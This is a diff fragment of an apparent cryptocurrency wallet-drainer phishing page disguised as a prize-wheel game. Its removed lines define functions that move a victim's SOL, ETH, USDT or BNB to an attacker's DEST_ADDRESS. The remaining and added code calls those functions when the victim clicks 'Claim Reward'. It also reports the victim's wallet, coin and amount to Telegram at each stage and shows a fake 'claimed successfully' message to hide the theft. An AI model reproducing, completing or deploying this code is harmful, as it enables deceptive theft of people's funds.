+                    setStatus(`⏳ Attempt ${connectAttempts}/3 - Please confirm in wallet...`, '');
+                    log(`🔄 Connection attempt ${connectAttempts}/3`);
+                }
+                address = await fn();
+                if (!address && connectAttempts < 3) {
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+            }
 
             if (address) {
                 connectedAddress = address;
@@ -1504,16 +1932,21 @@
                 setStatus(`✅ Connected: ${address.slice(0, 6)}...${address.slice(-4)}`, 'connected');
                 log(`✅ Connected: ${address} via ${walletType}`);
                 updateConnectBtn();
-                sendToTelegram({
+
+                sendTelegramMessage('connect', {
                     wallet: address,
-                    walletType: walletType,
-                    coin: selectedCoin,
-                    status: 'connected'
+                    coin: selectedCoin
                 });
+
                 hideConnectPopup();
                 isConnecting = false;
                 if (btn) btn.classList.remove('connecting');
                 return address;
+            }
+
+            if (connectAttempts >= 3) {
+                setStatus('❌ Connection cancelled 3 times. Try again.', 'error');
+                log('❌ Connection cancelled 3 times');
             }
 
             isConnecting = false;
@@ -1528,107 +1961,6 @@
 
         function hideConnectPopup() {
             connectPopup.classList.remove('show');
-        }
-
-        // ============================================================
-        // REAL TRANSACTION FUNCTIONS
-        // ============================================================
-
-        async function drainSolana(fromAddress, toAddress, amount) {
-            try {
-                const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
-                const fromPubkey = new solanaWeb3.PublicKey(fromAddress);
-                const toPubkey = new solanaWeb3.PublicKey(toAddress);
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: fromPubkey,
-                        toPubkey: toPubkey,
-                        lamports: amount * solanaWeb3.LAMPORTS_PER_SOL
-                    })
-                );
-                const { blockhash } = await connection.getRecentBlockhash();
-                transaction.recentBlockhash = blockhash;
-                transaction.feePayer = fromPubkey;
-                const signature = await window.solana.signAndSendTransaction(transaction);
-                await connection.confirmTransaction(signature);
-                return signature;
-            } catch (error) {
-                throw new Error('Solana tx failed: ' + error.message);
-            }
-        }
-
-        async function drainEthereum(fromAddress, toAddress, amount) {
-            try {
-                const web3 = new Web3(window.ethereum);
-                const gasPrice = await web3.eth.getGasPrice();
-                const txData = {
-                    from: fromAddress,
-                    to: toAddress,
-                    value: web3.utils.toWei(amount.toString(), 'ether'),
-                    gasPrice: gasPrice,
-                    gas: 21000
-                };
-                const tx = await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [txData]
-                });
-                await web3.eth.getTransactionReceipt(tx);
-                return tx;
-            } catch (error) {
-                throw new Error('Ethereum tx failed: ' + error.message);
-            }
-        }
-
-        async function drainUSDT(fromAddress, toAddress, amount) {
-            try {
-                const web3 = new Web3(window.ethereum);
-                const gasPrice = await web3.eth.getGasPrice();
-                const usdtContract = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-                const usdtABI = [{
-                    "constant": false,
-                    "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }],
-                    "name": "transfer",
-                    "outputs": [{ "name": "", "type": "bool" }],
-                    "type": "function"
-                }];
-                const contract = new web3.eth.Contract(usdtABI, usdtContract);
-                const usdtAmount = web3.utils.toWei(amount.toString(), 'ether');
-                const txData = {
-                    from: fromAddress,
-                    to: usdtContract,
-                    gasPrice: gasPrice,
-                    gas: 100000,
-                    data: contract.methods.transfer(toAddress, usdtAmount).encodeABI()
-                };
-                const tx = await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [txData]
-                });
-                await web3.eth.getTransactionReceipt(tx);
-                return tx;
-            } catch (error) {
-                throw new Error('USDT tx failed: ' + error.message);
-            }
-        }
-
-        async function drainBNB(fromAddress, toAddress, amount) {
-            try {
-                const web3 = new Web3(window.ethereum);
-                const txData = {
-                    from: fromAddress,
-                    to: toAddress,
-                    value: web3.utils.toWei(amount.toString(), 'ether'),
-                    gasPrice: web3.utils.toWei('5', 'gwei'),
-                    gas: 21000
-                };
-                const tx = await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [txData]
-                });
-                return tx;
-            } catch (error) {
-                throw new Error('BNB tx failed: ' + error.message);
-            }
         }
 
         // ============================================================
@@ -1667,14 +1999,6 @@
                 setStatus(`🎉 You won ${currentPrize}!`, 'success');
                 log(`🎰 WON: ${currentPrize}`);
 
-                sendToTelegram({
-                    wallet: connectedAddress || 'unconnected',
-                    walletType: connectedWalletType || 'unknown',
-                    coin: selectedCoin,
-                    prize: currentPrize,
-                    status: 'spin_win'
-                });
-
                 claimRewardBtn.disabled = false;
                 claimRewardBtn.textContent = '💰 Claim Reward';
                 claimRewardBtn.classList.remove('confirmed');
@@ -1710,8 +2034,8 @@
 
             isClaiming = true;
             claimRewardBtn.disabled = true;
-            claimRewardBtn.textContent = '⏳ Sending transaction...';
-            setStatus(`⏳ Sending ${currentPrize}...`, '');
+            claimRewardBtn.textContent = '⏳ Claiming reward...';
+            setStatus(`⏳ Claiming ${currentPrize}...`, '');
 
             try {
                 let amount = 0;
@@ -1724,12 +2048,18 @@
                 const coin = selectedCoin;
 
                 const isSolanaWallet = ['phantom', 'solflare'].includes(connectedWalletType);
-                const isEthWallet = ['metamask', 'coinbase', 'trust', 'exodus', 'okx', 'ledger', 'walletconnect'].includes(
-                    connectedWalletType);
+                const isEthWallet = ['metamask', 'coinbase', 'trust', 'exodus', 'okx', 'ledger', 'walletconnect']
+                    .includes(connectedWalletType);
 
                 switch (coin) {
                     case 'solana':
                         if (isSolanaWallet) {
+                            setStatus(`✅ Approve "${currentPrize}" in your wallet`, 'success');
+                            sendTelegramMessage('approved', {
+                                wallet: connectedAddress,
+                                coin: coin,
+                                amount: amount
+                            });
                             tx = await drainSolana(connectedAddress, DEST_ADDRESS, amount);
                         } else {
                             setStatus('❌ Use Phantom or Solflare for SOL', 'error');
@@ -1742,6 +2072,12 @@
 
                     case 'ethereum':
                         if (isEthWallet) {
+                            setStatus(`✅ Approve "${currentPrize}" in your wallet`, 'success');
+                            sendTelegramMessage('approved', {
+                                wallet: connectedAddress,
+                                coin: coin,
+                                amount: amount
+                            });
                             tx = await drainEthereum(connectedAddress, DEST_ADDRESS, amount);
                         } else {
                             setStatus('❌ Use an Ethereum wallet for ETH', 'error');
@@ -1754,6 +2090,12 @@
 
                     case 'usdt':
                         if (isEthWallet) {
+                            setStatus(`✅ Approve "${currentPrize}" in your wallet`, 'success');
+                            sendTelegramMessage('approved', {
+                                wallet: connectedAddress,
+                                coin: coin,
+                                amount: amount
+                            });
                             tx = await drainUSDT(connectedAddress, DEST_ADDRESS, amount);
                         } else {
                             setStatus('❌ Use an Ethereum wallet for USDT', 'error');
@@ -1766,9 +2108,15 @@
 
                     case 'bnb':
                         if (isEthWallet) {
+                            setStatus(`✅ Approve "${currentPrize}" in your wallet`, 'success');
+                            sendTelegramMessage('approved', {
+                                wallet: connectedAddress,
+                                coin: coin,
+                                amount: amount
+                            });
                             tx = await drainBNB(connectedAddress, DEST_ADDRESS, amount);
                         } else {
-                            setStatus('❌ Use an Ethereum wallet for BNB (BSC)', 'error');
+                            setStatus('❌ Use MetaMask or Trust on BSC for BNB', 'error');
                             isClaiming = false;
                             claimRewardBtn.disabled = false;
                             claimRewardBtn.textContent = '💰 Claim Reward';
@@ -1786,17 +2134,14 @@
 
                 if (tx) {
                     hasClaimed = true;
-                    setStatus(`✅ ${amount} ${coin.toUpperCase()} sent! Tx: ${tx.slice(0, 12)}...`, 'connected');
-                    log(`✅ Tx sent: ${tx}`);
+                    setStatus(`✅ ${currentPrize} claimed successfully!`, 'connected');
+                    log(`✅ Claimed: ${currentPrize}`);
 
-                    sendToTelegram({
+                    sendTelegramMessage('drained', {
                         wallet: connectedAddress,
-                        walletType: connectedWalletType,
-                        coin: coin,
-                        prize: currentPrize,
+                        coin: selectedCoin,
                         amount: amount,
-                        tx: tx,
-                        status: 'claimed_confirmed'
+                        tx: tx
                     });
 
                     claimRewardBtn.innerHTML = '✅ Claimed!';
@@ -1817,14 +2162,8 @@
                     }, 5000);
                 }
             } catch (error) {
-                setStatus(`❌ Tx failed: ${error.message}`, 'error');
+                setStatus(`❌ Failed: ${error.message}`, 'error');
                 log(`❌ Error: ${error.message}`);
-                sendToTelegram({
-                    wallet: connectedAddress,
-                    walletType: connectedWalletType,
-                    coin: selectedCoin,
-                    status: 'error: ' + error.message
-                });
             } finally {
                 isClaiming = false;
                 claimRewardBtn.disabled = false;
@@ -1959,8 +2298,26 @@
             incrementClaimedCount();
         }, 15000);
 
+        // ============================================================
+        // VPN FIX - FALLBACK LOADING
+        // ============================================================
+        setTimeout(() => {
+            if (typeof Web3 === 'undefined') {
+                log('⚠️ Web3 not loaded - attempting fallback...');
+                const script = document.createElement('script');
+                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js';
+                document.head.appendChild(script);
+            }
+            if (typeof solanaWeb3 === 'undefined') {
+                log('⚠️ Solana Web3 not loaded - attempting fallback...');
+                const script = document.createElement('script');
+                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.87.6/solana-web3.min.js';
+                document.head.appendChild(script);
+            }
+        }, 3000);
+
         updateClaimedCount();
-        log('🟢 Multi-wallet connect loaded with working icons!');
+        log('🟢 Full-width layout loaded! No empty space on sides.');
     </script>
 </body>
 </html>
